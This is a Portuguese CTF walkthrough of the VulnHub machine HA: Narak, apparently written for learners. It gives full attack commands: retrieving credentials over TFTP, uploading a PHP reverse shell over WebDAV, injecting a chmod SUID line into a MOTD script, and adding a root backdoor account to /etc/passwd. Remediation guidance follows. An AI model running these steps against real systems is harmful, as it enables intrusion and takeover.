# HA: Narak — Desça ao Submundo Hindu e Encontre Seu Caminho de Volta

Na mitologia hindu, Narak é o reino das punições, para onde as almas são enviadas para expiar seus pecados. Essa máquina é o equivalente digital: cada serviço esconde uma armadilha, cada credencial está codificada, e a escalação final está escondida à vista de todos dentro do script de boas-vindas do login. TFTP vaza credenciais em Base64, WebDAV deixa você entrar de boa, um script em Brainfuck guarda a movimentação lateral, e um script MOTD rodando como root entrega as chaves no final. Diabólico demais, mano. Top demais.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Narak |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-narak,569/ |
| **Técnicas** | Enumeração UDP, recuperação de credenciais via TFTP, decode Base64, upload de shell PHP via WebDAV com cadaver, decode Brainfuck, movimento lateral SSH, injeção em script MOTD, SUID no nano, edição de /etc/passwd |
| **CVEs** | CWE-284 (Controle de Acesso Indevido: WebDAV sem restrição de PUT), CWE-522 (Credenciais Insuficientemente Protegidas: TFTP em texto claro), CWE-269 (Gerenciamento de Privilégio Impróprio: editor com SUID) |
| **Grupos APT** | APT41: explora WebDAV mal configurado para acesso inicial; Lazarus Group: abusa de protocolos auxiliares (TFTP, FTP) para exfiltrar credenciais |

---

## Resumo do Ataque

```
nmap TCP → HTTP (80), SSH (22)
  → dirb → /webdav (auth HTTP necessária) + tips.txt + /igolder/
  → tips.txt → "procure creds.txt via outro protocolo"
  → nmap -sU -p 69 → TFTP aberto
  → tftp get creds.txt → decode base64 → yamdoot:Swarg
  → cadaver http://alvo/webdav → PUT shell.php → shell como www-data
  → find arquivos graváveis → /mnt/hell.sh (codificado em Brainfuck)
  → decode Brainfuck → chitragupt
  → ssh inferno@alvo (chitragupt) → flag de usuário
  → /etc/update-motd.d/00-header gravável → injetar chmod nano SUID
  → reconectar SSH → MOTD dispara como root → nano com SUID
  → nano /etc/passwd → adicionar usuário root jeenali
  → su jeenali → uid=0(root) → /root/root.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas TCP
2. Enumeração web: dirb para diretórios e arquivos
3. Varredura UDP para descobrir TFTP na porta 69
4. Recuperação de credenciais via TFTP e decode Base64
5. Upload de shell PHP via WebDAV com cadaver usando credenciais recuperadas
6. Pós-exploração: localizar e decodificar script Brainfuck
7. Movimento lateral SSH para usuário `inferno`
8. Injeção em script MOTD para definir SUID no nano
9. Escalação de privilégios via SUID do nano editando /etc/passwd

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.0.0/24
# Alvo: 192.168.0.136

nmap -sV -sC -p- 192.168.0.136
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd
```

Apenas SSH e HTTP no TCP. Sempre rode varredura UDP também, especialmente em máquinas boot2root que escondem TFTP.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

```bash
dirb http://192.168.0.136/
dirb http://192.168.0.136/ -X .txt
```

Descobertas principais:
- `/webdav`: retorna HTTP 401 (autenticação necessária)
- `tips.txt`: conteúdo aponta para outro protocolo
- `/igolder/`: referência temática à chave dourada

```bash
curl http://192.168.0.136/tips.txt
```

O arquivo de dicas aponta diretamente para TFTP. Elegante demais.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Varredura UDP e Recuperação de Credenciais via TFTP

Varreduras TCP nunca detectam TFTP. Execute uma varredura UDP direcionada:

```bash
nmap -sU -p 69 192.168.0.136
# 69/udp open  tftp
```

Recupere `creds.txt` via TFTP (sem autenticação por padrão):

```bash
tftp 192.168.0.136
tftp> get creds.txt
tftp> quit
cat creds.txt
# eWFtZG9vdDpTd2FyZw==

echo "eWFtZG9vdDpTd2FyZw==" | base64 -d
# yamdoot:Swarg
```

Credencial em Base64 via TFTP sem autenticação. Caramba.

**Nota do mundo real:** TFTP não tem autenticação. Ainda é encontrado em ambientes de produção para boot PXE, firmware de dispositivos de rede e provisionamento de telefones VoIP. As organizações frequentemente esquecem que está exposto e deixam credenciais ou arquivos de configuração acessíveis anonimamente.

**MITRE ATT&CK:** T1078.001 — Contas Válidas: Contas Padrão; T1552 — Credenciais Não Protegidas

---

## Passo 4 — Upload de Shell PHP via WebDAV com cadaver

Use a credencial recuperada para fazer upload de um shell PHP reverso:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar: $ip = '<IP_ATACANTE>'; $port = 4444;

cadaver http://192.168.0.136/webdav
dav:/webdav/> open http://192.168.0.136/webdav
# Usuário: yamdoot
# Senha: Swarg
dav:/webdav/> put /tmp/shell.php
dav:/webdav/> quit
```

Iniciar listener e disparar:

```bash
nc -lvnp 4444 &
curl http://192.168.0.136/webdav/shell.php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Shell como `www-data`. Dentro.

**Nota do mundo real:** WebDAV com PUT habilitado é efetivamente uma escrita remota de arquivos. Encontrado em SharePoint, SVN e sistemas legados de CMS. Múltiplas campanhas do APT41 usaram WebDAV mal configurado para entrega de webshell.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Script: Shell Unix

---

## Passo 5 — Estabilização do Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z
stty raw -echo; fg
# Enter duas vezes
```

Shell totalmente interativo agora.

---

## Passo 6 — Decode Brainfuck: Encontrando a Credencial Lateral

Procure arquivos graváveis ou interessantes:

```bash
find / -type f -perm -ug=rwx 2>/dev/null
cat /mnt/hell.sh
```

O script está codificado em Brainfuck. Copie o conteúdo e decodifique:

```bash
# Online: https://www.dcode.fr/brainfuck-language
# Saída decodificada: chitragupt
```

Chitragupt é o guardião divino dos registros em Narak na mitologia hindu. Temático demais.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1552.001 — Credenciais em Arquivos

---

## Passo 7 — Movimento Lateral SSH para `inferno`

```bash
ssh inferno@192.168.0.136
# Senha: chitragupt

cat /home/inferno/user.txt
```

Flag de usuário obtida. Bora, rapaziada.

**MITRE ATT&CK:** T1078 — Contas Válidas; T1021.004 — Serviços Remotos: SSH

---

## Passo 8 — Injeção no MOTD: Definindo SUID no nano

Os scripts MOTD em `/etc/update-motd.d/` rodam como root toda vez que um usuário faz login via SSH. Se esses arquivos são graváveis pelo usuário atual, a escalação é trivial:

```bash
ls -la /etc/update-motd.d/
# 00-header é gravável por inferno

echo "sudo chmod u+s /bin/nano" >> /etc/update-motd.d/00-header
```

Reconectar via SSH para disparar o MOTD como root:

```bash
ssh inferno@192.168.0.136
ls -la /bin/nano
# -rwsr-xr-x  (SUID definido!)
```

**Nota do mundo real:** Scripts MOTD rodando como root com permissões de escrita global aparecem em múltiplos relatórios de incidentes. O OceanLotus (APT32) enumera especificamente scripts MOTD e cron após acesso inicial em sistemas Linux como vetor de persistência e escalação.

**MITRE ATT&CK:** T1037.004 — Scripts de Inicialização; T1548.001 — Setuid e Setgid

---

## Passo 9 — SUID do nano: Edição de /etc/passwd para Root

Gere um hash de senha e adicione um novo usuário com nível root:

```bash
openssl passwd -1 -salt user3 pass123
# $1$user3$rAGRVf5p2jYTqtqOW5cPu/

nano /etc/passwd
# Adicionar ao final:
# jeenali:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash
```

Trocar para o novo usuário:

```bash
su jeenali
# Senha: pass123
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. Narak conquistado.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Utilizado para |
|---|---|---|---|
| Credencial | yamdoot:Swarg | TFTP creds.txt (Base64) | Login WebDAV via cadaver |
| Segredo Brainfuck | chitragupt | /mnt/hell.sh | Senha SSH para inferno |
| Flag de usuário | /home/inferno/user.txt | Após login SSH | Capturada |
| Flag root | /root/root.txt | Injeção MOTD + SUID nano + /etc/passwd | Capturada |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | TFTP aberto com credenciais acessíveis anonimamente | TFTP ainda está ativo em milhares de ambientes de produção para PXE e VoIP | Desabilite TFTP se não for necessário; restrinja por IP; nunca armazene credenciais em arquivos acessíveis via TFTP |
| 2 | WebDAV com PUT permitido e credenciais fracas | WebDAV com PUT habilitado é efetivamente escrita remota de arquivos | Desabilite WebDAV ou restrinja a fontes confiáveis; force autenticação forte |
| 3 | Scripts MOTD graváveis por usuário não-root | Injeção em MOTD é um vetor de persistência furtivo que sobrevive a reboots | Defina /etc/update-motd.d/ como root:root 755; audite todos os scripts executados como root |
| 4 | Senha codificada em Brainfuck em script gravável | Codificação não é criptografia; qualquer credencial codificada é recuperável | Use um gerenciador de segredos; nunca armazene credenciais em scripts, codificados ou não |
| 5 | SUID no nano permite modificação de /etc/passwd | Qualquer editor de texto com SUID garante root trivial | Audite binários SUID regularmente; nunca defina SUID em editores ou interpretadores |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Protegidas | T1552 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (WebDAV) | T1190 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados (Brainfuck) | T1027 |
| Escalação de Privilégios | Escalação de Privilégios | Scripts de Inicialização: MOTD | T1037.004 |
| Escalação de Privilégios | Escalação de Privilégios | Setuid e Setgid | T1548.001 |
| Persistência | Persistência | Criação de Conta: Conta Local | T1136.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar ou restringir TFTP**: `systemctl stop tftpd; systemctl disable tftpd`; se necessário, restrinja via `/etc/hosts.allow` a IPs de gerenciamento específicos
2. **Desabilitar WebDAV PUT**: no Apache, remova `dav_module`; ou restrinja PUT via `<LimitExcept GET POST>`
3. **Corrigir permissões dos scripts MOTD**: `chown root:root /etc/update-motd.d/*; chmod 755 /etc/update-motd.d/*`
4. **Remover SUID de editores**: `chmod u-s /bin/nano /usr/bin/vim`; audite regularmente com `find / -perm -4000 -type f 2>/dev/null`
5. **Rotacionar credenciais expostas**: yamdoot:Swarg e chitragupt devem ser invalidadas imediatamente

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (desabilitar WebDAV PUT; restringir TFTP)
- **D3-OAM**: Gerenciamento Administrativo de Sistema Operacional (auditoria SUID; permissões MOTD)
- **D3-HBPI**: Hardening de Integridade de Pipeline de Build (sem credenciais em scripts)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços UDP; auditar scripts MOTD e binários SUID |
| Proteger | Controle de Acesso | Desabilitar TFTP ou restringir a IPs confiáveis; remover permissões PUT do WebDAV |
| Proteger | Segurança de Dados | Remover credenciais de arquivos acessíveis via TFTP e scripts codificados |
| Detectar | Anomalias e Eventos | Alertar sobre requisições PUT no WebDAV; monitorar padrões de login SSH |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; remover webshells enviados |
| Recuperar | Planejamento de Recuperação | Auditar /etc/passwd e sudoers para modificações não autorizadas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restrições de PUT no WebDAV; controles de acesso TFTP |
| AC-6 | Menor Privilégio | Remover SUID de editores; restringir acesso de escrita ao MOTD |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar credenciais expostas via TFTP; forçar senhas fortes no WebDAV |
| CM-6 | Configurações | Auditar scripts MOTD; desabilitar protocolos desnecessários (TFTP) |
| CM-7 | Funcionalidade Mínima | Desabilitar WebDAV se não necessário; remover SUID de binários não essenciais |
| SC-28 | Proteção de Informação em Repouso | Sem credenciais em scripts, codificadas ou em texto claro |

---

## Reflexões Finais

HA: Narak merece o nome. Cada camada do submundo é uma classe diferente de vulnerabilidade: um serviço UDP esquecido, um protocolo sem autenticação, uma credencial ofuscada, um script de sistema gravável. A máquina ensina que enumeração completa vai além do TCP, e que vetores de escalação de privilégios estão escondidos nos lugares mais mundanos: um banner de login que roda como root.

O decode de Brainfuck é uma obra de arte. Qualquer jogador de CTF que já encarou aquela sintaxe pela primeira vez e pensou "isso não pode ser real" viveu a experiência de Narak.

Sensacional demais, véi. Bora pro próximo.

Thanks guys!! (❍ᴥ❍ʋ)
